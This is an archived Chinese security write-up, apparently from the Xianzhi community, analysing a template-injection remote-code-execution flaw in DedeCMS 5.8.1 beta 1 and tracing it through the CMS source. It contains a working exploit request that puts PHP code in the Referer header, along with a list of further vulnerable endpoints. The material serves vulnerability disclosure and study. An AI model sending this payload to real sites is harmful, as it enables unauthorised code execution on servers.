---
source: "MrWQ/vulnerability-paper"
product: "DedeCMS"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "DedeCMS-5.8.1 SSTI 模板注入导致 RCE - 先知社区"
prerequisites: "来源所述条件，未列明部分仍待核：5.8.1beta1; ShowMsg error path with Referer; writable template cache; PHP7-style callable literal"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://xz.aliyun.com/t/10519"
id: "vw-e7b14ad608e2bdffd8bbf80d"
entity_id: "ve-e7b14ad608e2bdffd8bbf80d"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：5.8.1beta1; ShowMsg error path with Referer; writable template cache; PHP7-style callable literal

- **结论使用边界（1）**：Utilization conditions section says only 'affected application', omitting runtime/cache details。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：Remediation recommends5.7.80 for5.8.1 beta without evidence of branch migration/fix equivalence。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **证据待核（3）**：Clear complete source-to-cache/include flow; no source-author link for Steven Seeley attribution。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（4）**：Large generic ParseTemplate listing could be condensed without losing root cause。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# DedeCMS-5.8.1 SSTI 模板注入导致 RCE - 先知社区

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10519)

> 先知社区，先知安全技术社区

### 影响范围

DedeCMS v5.8.1 beta 1

### 漏洞类型

SSTI RCE

### 利用条件

影响范围应用

### 漏洞概述

2021 年 9 月 30 日，国外安全研究人员 Steven Seeley 披露了最新的 DedeCMS 版本中存在的一处 SQL 注入漏洞以及一处 SSTI 导致的 RCE 漏洞，由于 SQL 注入漏洞利用条件极为苛刻，故这里只对该 SSTI 注入漏洞进行简要分析复现

### 漏洞复现

#### 环境搭建

这里使用 phpstudy 来搭建环境  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112140741-d838e004-437e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112140741-d838e004-437e-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112140800-e388a78c-437e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112140800-e388a78c-437e-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112140813-eb968fa2-437e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112140813-eb968fa2-437e-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112140826-f2f8a834-437e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112140826-f2f8a834-437e-1.png)  
网站前台：[http://192.168.59.1/index.php?upcache=1](http://192.168.59.1/index.php?upcache=1)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112140849-00eb8330-437f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112140849-00eb8330-437f-1.png)  
网站后台： [http://192.168.59.1/dede/login.php?gotopa](http://192.168.59.1/dede/login.php?gotopa)...  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112140911-0def0106-437f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112140911-0def0106-437f-1.png)

#### 漏洞利用

```
GET /plus/flink.php?dopost=save HTTP/1.1
Host: 192.168.59.1
Referer: <?php "system"(whoami);die;/*
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=rh4********************err; _csrf_name_26859a31=736**************************0f9; _csrf_name_26859a31__ckMd5=0f3**********390
Connection: close
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112141007-2f127a8e-437f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112141007-2f127a8e-437f-1.png)  
类似的 URL 还有：

```
/plus/flink.php?dopost=save
/plus/users_products.php?oid=1337     
/plus/download.php?aid=1337
/plus/showphoto.php?aid=1337
/plus/users-do.php?fmdo=sendMail
/plus/posttocar.php?id=1337
/plus/recommend.php
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112141044-4546c33c-437f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112141044-4546c33c-437f-1.png)

### 漏洞分析

漏洞入口位于 plus/flink.php 文件中，在该文件中如果我们传入的 dopost 值为 save 且未传递验证码时，紧接着会去调用 ShowMsg 函数：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112141127-5f36f8ac-437f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112141127-5f36f8ac-437f-1.png)  
之后跟踪进入到 include/common.func.php 文件中的 ShowMsg() 函数内

```
/**
 *  短消息函数,可以在某个动作处理后友好的提示信息
 *
 * @param  string $msg       消息提示信息
 * @param  string $gourl     跳转地址
 * @param  int    $onlymsg   仅显示信息
 * @param  int    $limittime 限制时间
 * @return void
 */
function ShowMsg($msg, $gourl, $onlymsg = 0, $limittime = 0)
{
    if (empty($GLOBALS['cfg_plus_dir'])) {
        $GLOBALS['cfg_plus_dir'] = '..';
    }
    if ($gourl == -1) {
        $gourl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
        if ($gourl == "") {
            $gourl = -1;
        }
    }

    $htmlhead = "
    <html>\r\n<head>\r\n<title>DedeCMS提示信息</title>\r\n
    <meta http-equiv=\"Content-Type\" content=\"text/html; charset={dede:global.cfg_soft_lang/}\" />
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\">
    <meta name=\"renderer\" content=\"webkit\">
    <meta http-equiv=\"Cache-Control\" content=\"no-siteapp\" />
    <link rel=\"stylesheet\" type=\"text/css\" href=\"{dede:global.cfg_assets_dir/}/pkg/uikit/css/uikit.min.css\" />
    <link rel=\"stylesheet\" type=\"text/css\" href=\"{dede:global.cfg_assets_dir/}/css/manage.dede.css\">
    <base target='_self'/>
    </head>
    <body>
    " . (isset($GLOBALS['ucsynlogin']) ? $GLOBALS['ucsynlogin'] : '') . "
    <center style=\"width:450px\" class=\"uk-container\">

    <div class=\"uk-card uk-card-small uk-card-default\" style=\"margin-top: 50px;\">
        <div class=\"uk-card-header\"  style=\"height:20px\">DedeCMS 提示信息！</div>

    <script>\r\n";
    $htmlfoot = "
    </script>


    </center>

    <script src=\"{dede:global.cfg_assets_dir/}/pkg/uikit/js/uikit.min.js\"></script>
    <script src=\"{dede:global.cfg_assets_dir/}/pkg/uikit/js/uikit-icons.min.js\"></script>
    </body>\r\n</html>\r\n";

    $litime = ($limittime == 0 ? 1000 : $limittime);
    $func = '';

    if ($gourl == '-1') {
        if ($limittime == 0) {
            $litime = 3000;
        }

        $gourl = "javascript:history.go(-1);";
    }

    if ($gourl == '' || $onlymsg == 1) {
        $msg = "<script>alert(\"" . str_replace("\"", "“", $msg) . "\");</script>";
    } else {
        //当网址为:close::objname 时, 关闭父框架的id=objname元素
        if (preg_match('/close::/', $gourl)) {
            $tgobj = trim(preg_replace('/close::/', '', $gourl));
            $gourl = 'javascript:;';
            $func .= "window.parent.document.getElementById('{$tgobj}').style.display='none';\r\n";
        }

        $func .= "var pgo=0;
      function JumpUrl(){
        if(pgo==0){ location='$gourl'; pgo=1; }
      }\r\n";
        $rmsg = $func;
        $rmsg .= "document.write(\"<div style='height:130px;font-size:10pt;background:#ffffff'><br />\");\r\n";
        $rmsg .= "document.write(\"" . str_replace("\"", "“", $msg) . "\");\r\n";
        $rmsg .= "document.write(\"";

        if ($onlymsg == 0) {
            if ($gourl != 'javascript:;' && $gourl != '') {
                $rmsg .= "<br /><a href='{$gourl}'>如果你的浏览器没反应，请点击这里...</a>";
                $rmsg .= "<br/></div>\");\r\n";
                $rmsg .= "setTimeout('JumpUrl()',$litime);";
            } else {
                $rmsg .= "<br/></div>\");\r\n";
            }
        } else {
            $rmsg .= "<br/><br/></div>\");\r\n";
        }
        $msg = $htmlhead . $rmsg . $htmlfoot;
    }
    $tpl = new DedeTemplate();
    $tpl->LoadString($msg);
    $tpl->Display();
}
```

在这里我们可以看到如果 $gourl 被设置为 - 1(间接可控)，则攻击者可以通过 HTTP_REFERER 控制 $gourl 处变量的值，而该变量未经过滤直接赋值给变量 $gourl，之后经过一系列的操作之后将 $gourl 与 html 代码拼接处理后转而调用 $tpl->LoadString 进行页面渲染操作，之后跟进 LoadString 可以看到此处的 sourceString 变量直接由 $str 赋值过来，该变量攻击者可控，之后将其进行一次 md5 计算，然后设置缓存文件和缓存配置文件名，缓存文件位于 data\tplcache 目录，之后调用 ParserTemplate 对文件进行解析：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112141229-84372f96-437f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112141229-84372f96-437f-1.png)  
ParserTemplate 如下：

```
/**
     *  解析模板
     *
     * @access public
     * @return void
     */
    public function ParseTemplate()
    {
        if ($this->makeLoop > 5) {
            return;
        }
        $this->count = -1;
        $this->cTags = array();
        $this->isParse = true;
        $sPos = 0;
        $ePos = 0;
        $tagStartWord = $this->tagStartWord;
        $fullTagEndWord = $this->fullTagEndWord;
        $sTagEndWord = $this->sTagEndWord;
        $tagEndWord = $this->tagEndWord;
        $startWordLen = strlen($tagStartWord);
        $sourceLen = strlen($this->sourceString);
        if ($sourceLen <= ($startWordLen + 3)) {
            return;
        }
        $cAtt = new TagAttributeParse();
        $cAtt->CharToLow = true;

        //遍历模板字符串，请取标记及其属性信息
        $t = 0;
        $preTag = '';
        $tswLen = strlen($tagStartWord);
        @$cAtt->cAttributes->items = array();
        for ($i = 0; $i < $sourceLen; $i++) {
            $ttagName = '';

            //如果不进行此判断，将无法识别相连的两个标记
            if ($i - 1 >= 0) {
                $ss = $i - 1;
            } else {
                $ss = 0;
            }
            $tagPos = strpos($this->sourceString, $tagStartWord, $ss);

            //判断后面是否还有模板标记
            if ($tagPos == 0 && ($sourceLen - $i < $tswLen
                || substr($this->sourceString, $i, $tswLen) != $tagStartWord)
            ) {
                $tagPos = -1;
                break;
            }

            //获取TAG基本信息
            for ($j = $tagPos + $startWordLen; $j < $tagPos + $startWordLen + $this->tagMaxLen; $j++) {
                if (preg_match("/[ >\/\r\n\t\}\.]/", $this->sourceString[$j])) {
                    break;
                } else {
                    $ttagName .= $this->sourceString[$j];
                }
            }
            if ($ttagName != '') {
                $i = $tagPos + $startWordLen;
                $endPos = -1;

                //判断  '/}' '{tag:下一标记开始' '{/tag:标记结束' 谁最靠近
                $fullTagEndWordThis = $fullTagEndWord . $ttagName . $tagEndWord;
                $e1 = strpos($this->sourceString, $sTagEndWord, $i);
                $e2 = strpos($this->sourceString, $tagStartWord, $i);
                $e3 = strpos($this->sourceString, $fullTagEndWordThis, $i);
                $e1 = trim($e1);
                $e2 = trim($e2);
                $e3 = trim($e3);
                $e1 = ($e1 == '' ? '-1' : $e1);
                $e2 = ($e2 == '' ? '-1' : $e2);
                $e3 = ($e3 == '' ? '-1' : $e3);
                if ($e3 == -1) {
                    //不存在'{/tag:标记'
                    $endPos = $e1;
                    $elen = $endPos + strlen($sTagEndWord);
                } else if ($e1 == -1) {
                    //不存在 '/}'
                    $endPos = $e3;
                    $elen = $endPos + strlen($fullTagEndWordThis);
                }

                //同时存在 '/}' 和 '{/tag:标记'
                else {
                    //如果 '/}' 比 '{tag:'、'{/tag:标记' 都要靠近，则认为结束标志是 '/}'，否则结束标志为 '{/tag:标记'
                    if ($e1 < $e2 && $e1 < $e3) {
                        $endPos = $e1;
                        $elen = $endPos + strlen($sTagEndWord);
                    } else {
                        $endPos = $e3;
                        $elen = $endPos + strlen($fullTagEndWordThis);
                    }
                }

                //如果找不到结束标记，则认为这个标记存在错误
                if ($endPos == -1) {
                    echo "Tpl Character postion $tagPos, '$ttagName' Error！<br />\r\n";
                    break;
                }
                $i = $elen;

                //分析所找到的标记位置等信息
                $attStr = '';
                $innerText = '';
                $startInner = 0;
                for ($j = $tagPos + $startWordLen; $j < $endPos; $j++) {
                    if ($startInner == 0) {
                        if ($this->sourceString[$j] == $tagEndWord) {
                            $startInner = 1;
                            continue;
                        } else {
                            $attStr .= $this->sourceString[$j];
                        }
                    } else {
                        $innerText .= $this->sourceString[$j];
                    }
                }
                $ttagName = strtolower($ttagName);

                //if、php标记，把整个属性串视为属性
                if (preg_match("/^if[0-9]{0,}$/", $ttagName)) {
                    $cAtt->cAttributes = new TagAttribute();
                    $cAtt->cAttributes->count = 2;
                    $cAtt->cAttributes->items['tagname'] = $ttagName;
                    $cAtt->cAttributes->items['condition'] = preg_replace("/^if[0-9]{0,}[\r\n\t ]/", "", $attStr);
                    $innerText = preg_replace("/\{else\}/i", '<' . "?php\r\n}\r\nelse{\r\n" . '?' . '>', $innerText);
                } else if ($ttagName == 'php') {
                    $cAtt->cAttributes = new TagAttribute();
                    $cAtt->cAttributes->count = 2;
                    $cAtt->cAttributes->items['tagname'] = $ttagName;
                    $cAtt->cAttributes->items['code'] = '<' . "?php\r\n" . trim(
                        preg_replace(
                            "/^php[0-9]{0,}[\r\n\t ]/",
                            "", $attStr
                        )
                    ) . "\r\n?" . '>';
                } else {
                    //普通标记，解释属性
                    $cAtt->SetSource($attStr);
                }
                $this->count++;
                $cTag = new Tag();
                $cTag->tagName = $ttagName;
                $cTag->startPos = $tagPos;
                $cTag->endPos = $i;
                $cTag->cAtt = $cAtt->cAttributes;
                $cTag->isCompiler = false;
                $cTag->tagID = $this->count;
                $cTag->innerText = $innerText;
                $this->cTags[$this->count] = $cTag;
            } else {
                $i = $tagPos + $startWordLen;
                break;
            }
        } //结束遍历模板字符串
        if ($this->count > -1 && $this->isCompiler) {
            $this->CompilerAll();
        }
    }
```

之后返回上一级，在这里会紧接着调用 Display 函数对解析结果进行展示，在这里会调用 WriteCache 函数  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112141311-9d337180-437f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112141311-9d337180-437f-1.png)  
在 WriteCache 函数中写入缓存文件：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112141352-b592e76a-437f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112141352-b592e76a-437f-1.png)  
在这里使用 GetResult 返回值 sourceString 来设置 $result 变量，该变量包含攻击者控制的输入数据：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112141428-caf43604-437f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112141428-caf43604-437f-1.png)  
之后调用 CheckDisabledFunctions 函数进行检查操作，该函数主要用于检查是否存在被禁止的函数，然后通过 token_get_all_nl 函数获取输入，然而处理时并没有过滤双引号，存在被绕过的风险，攻击者可以通过将恶意 PHP 写到临时文件，之后在 Display 函数处通过 include $tpl->CacheFile() 将恶意临时文件包含进来从而实现远程代码执行：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211112141523-ebb1a05c-437f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211112141523-ebb1a05c-437f-1.png)

### 安全建议

目前官方已发布最新版本: DedeCMS V5.7.80 UTF-8 正式版，建议升级到该版本

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
